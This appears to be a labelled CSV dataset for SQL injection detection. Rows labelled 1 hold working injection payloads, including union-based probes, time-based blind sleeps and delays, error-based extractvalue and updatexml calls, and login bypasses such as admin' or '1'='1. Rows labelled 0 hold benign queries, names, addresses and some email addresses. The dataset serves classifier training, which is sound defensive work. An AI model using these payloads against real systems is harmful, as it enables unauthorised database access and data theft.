Query,Label
SELECT AVG ( test ) FROM look SELECT SUM ( free ) ,0
SELECT floor ( s )  FROM sugar,0
SELECT * FROM column WHERE captain NOT BETWEEN 'dear' AND 'variety',0
"  SELECT * FROM glass WHERE life IN  ( 'fall', 'slip', 'heat' )  ",0
"1""  )   as doai where 7024  =  7024 union all select null,null,null,null,null,null,null,null--",1
pryor,0
-6449'   )    )    or 2590  =  2848,1
SELECT * FROM wp_posts WHERE ID  =  28705 LIMIT 1,0
SELECT * FROM  ( SELECT fight FROM roll ) ,0
"1""   )    )    and 8329  =  5584#",1
1'  )   where 9516  =  9516,1
fnico,0
91650654r,0
SELECT ALL ProductName FROM Products WHERE TRUE;,0
"   SELECT Employees.final, COUNT ( Orders.earlyID )  AS carFROM    ( OrdersINNER JOIN which ON Orders.supportID  =  Employees.soilID ) ",0
-5258  )   or   (  8459  =  8459  )  *4906,1
"1""  )   as qayu where 6222  =  6222 union all select null,null,null#",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  '%'  =  '",1
SELECT * FROM night WHERE soldier = 'past' FETCH FIRST 3 ROWS ONLY,0
SELECT MIN ( choice )  AS play FROM extra,0
SELECT * FROM chief WHERE morning LIKE '%force%',0
SELECT DISTINCT spoken FROM tribe,0
SELECT * FROM island WHERE usually = 'way' FETCH FIRST 3 ROWS ONLY,0
"  SELECT quick,equator,child FROM press LEFT JOIN Orders ON increase.suggestID =  master.village ORDER BY route.tent",0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_4_link' LIMIT 1,0
domeable,0
latimer@puntodevistafotografia.ve,0
"1'  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'ckfn' like 'ckfn",1
SELECT * FROM this  WHERE flag NOT LIKE '[get]%',0
SELECT Count ( * )  AS greatly,0
"1 where 8333  =  8333 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT COUNT ( nuts ) FROM count,0
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'qgov'  =  'qgov",1
"c/ fernandez shaw, 177 1-e",0
SELECT * FROM strange WHERE rabbit BETWEEN '1996-07-01' AND '1996-07-31',0
1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,1
"1""  )   where 7578  =  7578 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3783 )  ORDER BY meta_id ASC",0
7a7i86,0
"1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1%'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '",1
1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,1
"""&""",1
SELECT AVG ( bet ) FROM location,0
SELECT AVG ( touch ) FROM then,0
1'+  (  select gkve where 1943  =  1943 waitfor delay '0:0:5'  )  +',1
"CREATE TABLE IF NOT EXISTS `zcf_submitlogs`  (  `id` int ( 6 )  unsigned NOT NULL AUTO_INCREMENT, `crmsubmitlogStatus` varchar ( 20 )  DEFAULT NULL, `crmsubmitlogDescribtion` longtext NOT NULL, `crmsubmitFormType` varchar ( 30 )  NOT NULL, PRIMARY KEY  (  id  )   )  ENGINE = InnoDB DEFAULT CHARSET = utf8",0
1 where 2649  =  2649 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
SELECT COUNT ( fish ) FROM wonderful,0
boget brufau,0
SELECT pleasure ( s )  FROM wire LEFT JOIN,0
"c/ gallarza, 147",0
"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",1
SELECT again ( s )  FROM sets LEFT JOIN,0
"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",1
casasnova vadal,0
"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",1
SELECT * FROM globe ORDER BY palace DESC,0
"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"  SELECT serious,season,value FROM horn LEFT JOIN Orders ON huge.studiedID =  bigger.die ORDER BY exclaimed.for",0
SELECT * FROM wp_posts WHERE ID  =  262311 LIMIT 1,0
bablica,0
select   (  case when   (  9246  =  6326  )   then 9246 else 9246*  (  select 9246 from mysql.db  )   end  )  #,1
"1,  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",1
"-7333%""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,1
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1
"-7202%""   )    )    union all select 2901#",1
SELECT * FROM wood WHERE NOT recent = 'tone'  AND NOT wore = 'those',0
portillo,0
-4669  )   or 2452  =  1601#,1
"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",1
"1""   )    )    as dcrk where 5164  =  5164 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
6.1724E+15,0
1'+  (  select 'iqxn' where 1146  =  1146 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',1
16370,0
SELECT raise,0
SELECT * FROM chain WHERE out = 'division' LIMIT 3,0
29385081m,0
cuarter8da,0
"1',iif  (  6625  =  6625,1,1/0  )  ",1
"  SELECT giant AS rhyme, copper AS [particular]  FROM loose",0
revivificar,0
caine@albeiteria.es,0
"-3102  )   union all select 6707,6707,6707,6707--",1
mccaffria_malanowicz@fbi-criminal-network.com.mr,0
"-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
40151,0
-4057'  )   order by 1#,1
SELECT * FROM prepare WHERE began NOT LIKE 'flew%',0
"entrada tamarit, 32,",0
despernada,0
SELECT * FROM car WHERE won IN  ( SELECT silver FROM general ) ,0
SELECT * FROM piece WHERE twelve = 'ship'  AND City = 'excellent',0
leafloor,0
"1'||  (  select 'aoad' where 8795  =  8795 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1
polvo,0
ariel,0
merkling,0
1%'   )    )    waitfor delay '0:0:5'--,1
SELECT COUNT ( DISTINCT last )  FROM simple,0
"-9684"" order by 1#",1
SELECT Count ( * )  AS imagine,0
"calle prat de la riba, 73",0
SELECT TOP 50 PERCENT * FROM map SELECT * FROM shown FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grown,0
"1%"" rlike sleep  (  5  )   and ""%""  =  """,1
"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",1
SELECT shake,0
SELECT * FROM  ( SELECT private FROM said ) ,0
select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
argeo,0
"c/ gravina, s/n",0
" SELECT column_name ( s )  FROM seat,labor",0
hermanos gascon 141,0
paley,0
"-2247'  )   union all select 1202,1202,1202,1202,1202#",1
SELECT * FROM statement WHERE bell  BETWEEN 10 AND 20,0
"iif  (  2452  =  8999,1,1/0  )  ",1
-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
monteys bold,0
SELECT familiar,0
1 where 2060  =  2060,1
"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xtyt""  =  ""xtyt",1
siu-ling,0
SELECT * FROM immediately WHERE face = 'home'  OR death = 'class',0
"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,1
segura reygadas,0
SELECT TOP 3 * FROM doubt WHERE smaller = 'hidden',0
SELECT AVG ( Price ) FROM egg,0
SELECT Count ( * )  AS badly,0
"1""   )    )     )   order by 1#",1
SELECT * FROM fox FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM bread,0
lladurs,0
brenn,0
1' where 2145  =  2145,1
"-3037""   )    )     )   or elt  (  4758  =  9129,9129  )   and    (    (     (  ""zewv"" like ""zewv",1
newport,0
-2806'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'rxzr'  =  'rxzr,1
SELECT * FROM ranch WHERE instead = 'gas'  OR travel = 'variety',0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""%""  =  """,1
SELECT vowel ( s ) FROM burn INNER JOIN,0
"SELECT DATE_ADD ( ""2017-06-15 09:34:21"", INTERVAL -3 HOUR ) ;",0
1   )    )    as fqee where 3286  =  3286,1
SELECT * FROM shout WHERE talk NOT BETWEEN 'importance' AND 'grade',0
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1
comba,0
8110,0
5.50989E+15,0
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,1
91553356q,0
c/ agachadilla 81,0
" SELECT * FROM directly ORDER BY river ASC, return DESC",0
"1""   )    )     )   and 4967  =  8866 and    (    (     (  ""jzyn"" like ""jzyn",1
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",1
SELECT * FROM eat WHERE NOT hope = 'sugar'  AND NOT bone = 'grass',0
29%,1
"call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  --",1
dean,0
breon@sexotelefono.mc,0
SELECT * FROM letter WHERE too BETWEEN 'slabs' AND 'ten',0
"  SELECT lengthID AS ID, girl AS fastened FROM imagine",0
9.66866E+15,0
"c/ andres piquer 175, 2?b",0
arguisuelas,0
"1 where 5332  =  5332 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
"gimnasia 153, 4?e",0
select case when 7426  =  6635 then 1 else null end--,1
SELECT * FROM shake WHERE ahead IN  ( SELECT expect FROM object ) ,0
or 3  =  3 --,1
6225,0
mara,0
SELECT COUNT ( somewhereID ) FROM increase,0
"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1
SELECT MIN ( around )  AS major FROM found,0
co5r5525e,0
admin'  )   or '1'  =  '1'/*,1
SELECT AVG ( too ) FROM buffalo,0
"   SELECT sides, sort, rose FROM came WHERE eye  IS NULL",0
1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
SELECT AVG ( Price ) FROM melted,0
 UPDATE brick SET may = 'taste'WHERE score = 'key',0
"1'||  (  select 'dukt' where 3206  =  3206 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1
1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   '%'  =  ',1
34830,0
SELECT noise ( s )  FROM south FULL OUTER JOIN,0
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
SELECT * FROM structure WHERE brought BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT column1 , column2 , column3 , ... INTO newtable [IN externaldb ] FROM oldtable WHERE condition;",0
SELECT * FROM song  WHERE shelf = frozen,0
"-9535"" order by 1--",1
"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"SELECT * FROM duty WHERE topic BETWEEN ""card"" AND    ""equipment""",0
3.786E+15,0
"INSERT INTO blood ( meal, each, term, mental, heard, smaller )  VALUES  ( 'her', 'help'. pure', 'develop', 'tell', 'bone', 'constantly' )  ",0
gift@distritoeste.no,0
"calle espio, 120, 11?a",0
obed9e3cia0,0
satandera,0
SELECT stronger ( s )  FROM machine SELECT proud ( s ) ,0
SELECT * FROM largest WHERE rhythm = 'breathe',0
DELETE FROM enemy,0
SELECT * FROM package WHERE slip = 'dozen'  AND City = 'palace',0
decour raichs,0
"  SELECT rocky AS compound, chosen AS [lady]  FROM key",0
"av. italia, 66, 4-a",0
SELECT * FROM comfortable FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM chamber,0
SELECT TOP 50 PERCENT * FROM nodded,0
SELECT * FROM board WHERE    NOT arrow = 'mind',0
"-9405'  )   union all select 8283,8283,8283,8283--",1
"1""  )   rlike sleep  (  5  )   and   (  ""rfsd""  =  ""rfsd",1
1  )   where 3381  =  3381 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1
SELECT * FROM essential WHERE Price NOT BETWEEN 10 AND 20,0
voseo,0
"1""  )   and elt  (  4249  =  4249,7259  )   and   (  ""xgka"" like ""xgka",1
a3o1erada,0
"virgen de los imposibles 162,",0
segovia,0
"  UPDATE bent SET compare =  'arrive', City =  'provide' WHERE chart =  spin",0
SELECT * FROM public FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM play,0
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",1
SELECT * FROM meant  WHERE post NOT LIKE '[hour]%',0
"  SELECT SUBDATE ( ""2017-06-15"", INTERVAL 10 DAY ) ;",0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'hmsu'  =  'hmsu",1
4.80991E+15,0
san juan bosco 113 1-d,0
"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fktl""  =  ""fktl",1
SELECT COUNT ( tears ) FROM might,0
SELECT * FROM belong 3,0
SELECT * FROM CustomersFETCH FIRST 3 ROWS ONLY;,0
"1'  )   as viex where 6242  =  6242 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
"1%"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,1
1%' order by 1--,1
SELECT AVG ( balloon ) FROM stream,0
SELECT AVG ( duck )  FROM box  SELECT SUM ( triangle ) ,0
"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1
37795,0
"-4923"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""afjc"" like ""afjc",1
SELECT TOP 3 * FROM discuss,0
SELECT COUNT ( funny ) FROM damage,0
"  SELECT * FROM willing WHERE copper IN  ( 'control', 'furniture', 'solution' )  ",0
"1""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"-8614'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
1   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   1260  =  1260,1
"1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
SELECT AVG ( quickly )  FROM master  SELECT SUM ( vowel ) ,0
"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",1
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",1
"  SELECT fall,empty FROM language WHERE darkness = 'distant' UNION SELECT way, never FROM made",0
SELECT * FROM farm,0
souther,0
calle clavel 30 11?b,0
"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg",1
55,0
SELECT * FROM stream 3 SELECT * FROM unhappy,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  '%'  =  '",1
-9405' union all select 2539--,1
"1,extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",1
SELECT * FROM sudden WHERE pig = 'pile'  OR hand = 'mix',0
"  SELECT TIME_FORMAT ( ""19:30:10"", ""%T"" ) ;",0
1'+  (  select 'wyxu' where 2555  =  2555 union all select null#,1
"iif  (  2205  =  4764,1,1/0  )  ",1
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda",1
"1%'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",1
selwart@studentrooms.zr,0
SELECT * FROM cent WHERE    NOT bound = 'memory',0
4.43607E+15,0
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1
"  SELECT * FROM here WHERE gun NOT IN  ( 'power', 'shorter', 'sound' )  ",0
SELECT COUNT ( earlier )  FROM experience,0
" SELECT column_name ( s )  FROM father,wide",0
SELECT * FROM fly WHERE nails = 'layers' FETCH FIRST 3 ROWS ONLY,0
"1""   )    )    as dvpb where 6673  =  6673",1
-1700%' or 4149  =  3391#,1
kovac,0
tamerlani@ubikuo.cc,0
33500,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2767' LIMIT 1,0
 UPDATE pie SET prize = 'nodded'WHERE coal = 'under',0
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,1
SELECT * FROM mother WHERE mark = 'thrown'  AND  ( cap = 'half' OR flag = 'factor' ) ,0
8.52064E+15,0
llers marquile,0
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1
37329,0
"   SELECT bone, paper+ ', ' + cookies+ ' ' + upper+ ', ' + meat AS bare  FROM this",0
SELECT trick ( s FROM tall RIGHT JOIN,0
SELECT AVG ( basic ) FROM belt SELECT SUM ( carefully ) ,0
"-1920'   )    )     )   union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",1
"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",1
"INSERT INTO chicken ( belt, bad, guess, perhaps, girl, part )  VALUES  ( 'feature', 'hidden'. surprise', 'shown', 'wind', 'minute', 'bet' )  ",0
"1%"" or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
urbina granda,0
mario caraball,0
SELECT * FROM compare WHERE period  BETWEEN 10 AND 20,0
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'snad' like 'snad",1
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",1
jovn,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lijy'  =  'lijy",1
atuesta venturi,0
-8665' or 6825  =  7840 and 'vbsy' like 'vbsy,1
SELECT Count ( * )  AS primitive,0
2.4082E+15,0
4.78072E+15,0
SELECT drop,0
SELECT lunch ( s FROM dead RIGHT JOIN,0
select   (  case when   (  8711  =  6432  )   then 1 else 8711*  (  select 8711 from master..sysdatabases  )   end  )  --,1
SELECT ProductName FROM Products WHERE ProductID  =  ALL,0
"1%'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM calm WHERE metal = 'remove' LIMIT 3,0
end and    (    (     (  4675  =  4675,1
"-6662""   )    )    union all select 6755--",1
calle constanti s/n 5?h,0
49211,0
if  (  1087  =  5839  )   select 1087 else drop function zzeh--,1
SELECT * FROM crew FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM piece WHERE raw = 'wide'  AND  ( brass = 'hat' OR newspaper = 'understanding' ) ,0
2.42593E+15,0
SELECT * FROM loose WHERE depth = 'attention' FETCH FIRST 3 ROWS ONLY,0
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'nepn'  =  'nepn",1
"  SELECT   IF ( 500<1000, ""YES"", ""NO"" ) ;",0
"   SELECT railroad,well,stove,policeman,level     (  (  source JOIN muscle ON eventually.citizen =  library.sense )   INNER JOIN willingON Orders.danger =  away.compositionID ) ",0
SELECT * FROM pool WHERE relationship  BETWEEN 10 AND 20,0
SELECT * FROM courage WHERE method = 'tobacco'  AND  ( wonderful = 'tool' OR best = 'laid' ) ,0
25500,0
1  )   and 2457  =  8146,1
"INSERT INTO which ( mile, friend, finish, monkey, word, then )  VALUES  ( 'against', 'recently'. gray', 'sum', 'stock', 'fastened', 'go' )  ",0
elvian,0
"""hi""""  )   or   (  """"a""""  =  """"a""",1
SELECT division ( s )  FROM satisfied UNION,0
jndula couttolenc,0
SELECT * FROM known WHERE layers = 'opinion'  OR arrange = 'fed',0
SELECT agree FROM sink UNION SELECT brown FROM ill ORDER BY describe,0
SELECT flew ( s )  FROM only UNION,0
19140,0
caball,0
SELECT * FROM individual 3 SELECT * FROM gradually,0
1   )    )     )   order by 1#,1
"c/ juan de rihuerga, 0,",0
"-8777""  )   as lalf where 8606  =  8606 or elt  (  4397  =  5823,5823  )  --",1
SELECT hearing FROM local UNION SELECT short FROM film ORDER BY show,0
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",1
"1""  )   as ktnq where 9005  =  9005",1
SELECT * FROM wing WHERE weigh BETWEEN 'bit' AND 'while',0
SELECT * FROM  ( SELECT view FROM shallow ) ,0
"1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '",1
select   (  case when   (  2774  =  5503  )   then 2774 else 2774*  (  select 2774 from information_schema.character_sets  )   end  )  #,1
1'||  (  select 'svnn' from dual where 8710  =  8710,1
SELECT * FROM follow WHERE habit BETWEEN garden09/01/1996rich AND nice15/31/1996hat,0
mertin lombana,0
" select * from users where id  =  1 union select 1<@.,version  (    )   -- 1",1
